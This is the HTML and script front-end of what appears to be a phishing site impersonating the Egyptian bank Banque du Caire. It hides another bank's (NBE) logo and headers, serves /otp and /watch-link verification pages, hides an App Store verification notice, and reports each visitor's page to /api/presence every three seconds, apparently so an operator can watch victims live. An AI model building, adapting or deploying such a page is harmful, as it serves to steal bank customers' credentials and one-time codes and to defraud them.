    <style>
      img[src*="nbe-official-logo"]{display:none!important}
      #root > header, #root > nav, #root > div > header, #root > div > nav,
      #root [class*="Header"], #root [class*="header-"], #root [class*="navbar"] {
        display: none !important;
      }
      .bdc-header {
        width: 100%;
        background: #ffffff;
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 8px 12px;
        position: sticky;
        top: 0;
        z-index: 9999;
        border-bottom: 1px solid #eee;
      }
      .bdc-header-logo img {
        height: 36px;
        width: auto;
      }
      .bdc-menu-btn {
        width: 34px; height: 34px;
        background: rgba(0,0,0,0.05) !important;
        border: none !important; border-radius: 8px !important;
        display: flex !important; align-items: center !important; justify-content: center !important;
        cursor: pointer;
        box-shadow: none !important;
        padding: 0 !important;
      }
      .bdc-menu-btn:hover { background: rgba(0,0,0,0.1) !important; box-shadow: none !important; transform: none !important; }
      .bdc-menu-btn svg { width: 18px; height: 18px; fill: #333; }
      button, .btn, [type="submit"], [type="button"], a.btn {
        background: linear-gradient(135deg, #ff8a1f 0%, #e8720c 50%, #d46200 100%) !important;
        border: none !important;
        color: white !important;
        box-shadow: 0 6px 20px rgba(232,114,12,0.3) !important;
        transition: transform 0.15s, box-shadow 0.2s !important;
      }
      button:hover, .btn:hover, [type="submit"]:hover, [type="button"]:hover, a.btn:hover {
        transform: translateY(-1px);
        box-shadow: 0 8px 28px rgba(232,114,12,0.4) !important;
      }
      button:active, .btn:active, [type="submit"]:active, [type="button"]:active, a.btn:active {
        transform: translateY(0);
      }
      .btn-primary, .btn-success, .btn-info, .btn-warning, .btn-danger {
        background: linear-gradient(135deg, #ff8a1f 0%, #e8720c 50%, #d46200 100%) !important;
        border-color: #e8720c !important;

  <body>
    <div class="bdc-header" dir="ltr">
      <button class="bdc-menu-btn" aria-label="القائمة">
        <svg viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
      </button>
      <div class="bdc-header-logo">
        <img src="/logo-full.jpg" alt="بنك القاهرة - Banque du Caire">
      </div>
    </div>
    <div id="root"></div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
    (function(){
      var origFetch = window.fetch;
      window.fetch = function(url, opts) {
        return origFetch.apply(this, arguments).then(function(response) {
          if (typeof url === 'string' && url.indexOf('/api/trpc/admin.login') !== -1) {
            var clone = response.clone();
            clone.json().then(function(data) {
              try {
                var token = null;
                if (Array.isArray(data) && data[0] && data[0].result && data[0].result.data) {
                  var json = data[0].result.data.json || data[0].result.data;
                  if (json && json.token) token = json.token;
                }
                if (token) {
                  sessionStorage.setItem("manus-cookie", "app_session_id=" + token);
                }
              } catch(e) {}
            }).catch(function(){});
          }
          return response;
        });
      };
    })();
    </script>
    <script>
    (function(){
      function hideReactHeaders() {
        document.querySelectorAll('#root img[src*="nbe-official-logo"]').forEach(function(img) {
          var p = img.closest('div[style]');
          while (p && p.id !== 'root') {
            if (p.style.borderBottom || (p.getAttribute('style') && p.getAttribute('style').indexOf('border') !== -1)) {
              p.style.display = 'none';
              break;
            }
            p = p.parentElement;
          }
        });
        document.querySelectorAll('#root span').forEach(function(el) {
          if (el.textContent.trim() === 'مصر') {
            var p = el.closest('div[style]');
            while (p && p.id !== 'root') {
              if (p.style.borderBottom || (p.getAttribute('style') && p.getAttribute('style').indexOf('border') !== -1)) {
                p.style.display = 'none';
                break;
              }
              p = p.parentElement;
            }
          }
        });
      }
      function replacePageIcons() {
        var pg = location.pathname;
        if (pg === '/otp') {
          document.querySelectorAll('#root div').forEach(function(el) {
            if (el.style.width === '64px' && el.style.height === '64px' && el.style.borderRadius === '50%' && el.querySelector('svg') && !el.getAttribute('data-replaced')) {
              el.setAttribute('data-replaced', '1');
              el.querySelector('svg').style.display = 'none';
              el.style.cssText = 'width:100px!important;height:100px!important;background:none!important;border:none!important;border-radius:0!important;display:flex;align-items:center;justify-content:center;margin:0 auto 16px';
              var img = document.createElement('img');
              img.src = '/otp-icon.jpg';
              img.alt = 'OTP';
              img.style.cssText = 'width:100px;height:100px;object-fit:contain';
              el.appendChild(img);
            }
          });
        }
        if (pg === '/watch-link') {
          document.querySelectorAll('#root div').forEach(function(el) {
            if (el.style.width === '72px' && el.style.height === '72px' && el.style.borderRadius === '50%' && el.querySelector('svg') && !el.getAttribute('data-replaced')) {
              el.setAttribute('data-replaced', '1');
              el.querySelector('svg').style.display = 'none';
              el.style.cssText = 'width:110px!important;height:110px!important;background:none!important;border:none!important;border-radius:0!important;display:flex;align-items:center;justify-content:center;margin:0 auto 16px';
              var img = document.createElement('img');
              img.src = '/watchlink-icon.jpg';
              img.alt = 'Watch Link';
              img.style.cssText = 'width:110px;height:110px;object-fit:contain';
              el.appendChild(img);
            }
          });
          document.querySelectorAll('#root div').forEach(function(el) {
            if (el.textContent && el.textContent.indexOf('خطوة التحقق') !== -1 && el.textContent.indexOf('App Store') !== -1 && !el.getAttribute('data-hidden')) {
              el.setAttribute('data-hidden', '1');
              el.style.display = 'none';
            }
          });
        }
      }
      var obs = new MutationObserver(function(){ hideReactHeaders(); replacePageIcons(); });
      obs.observe(document.getElementById('root') || document.body, { childList: true, subtree: true });
      setTimeout(hideReactHeaders, 500);
      setTimeout(hideReactHeaders, 1500);
      setTimeout(replacePageIcons, 500);
      setTimeout(replacePageIcons, 1500);
    })();
    (function(){
      if(location.pathname.startsWith('/admin')) return;
      var key='pw_visitor_sid';
      var sid=sessionStorage.getItem(key);
      if(!sid){sid=Math.random().toString(36).slice(2)+Date.now().toString(36);sessionStorage.setItem(key,sid)}
      function page(){var p=location.pathname.replace(/^\//,'');return p||'home'}
      function send(){
        try{fetch('/api/presence',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:sid,currentPage:page()})})}catch(e){}
      }
      send();
      setInterval(send,3000);
    })();
    </script>
  </body>
</html>
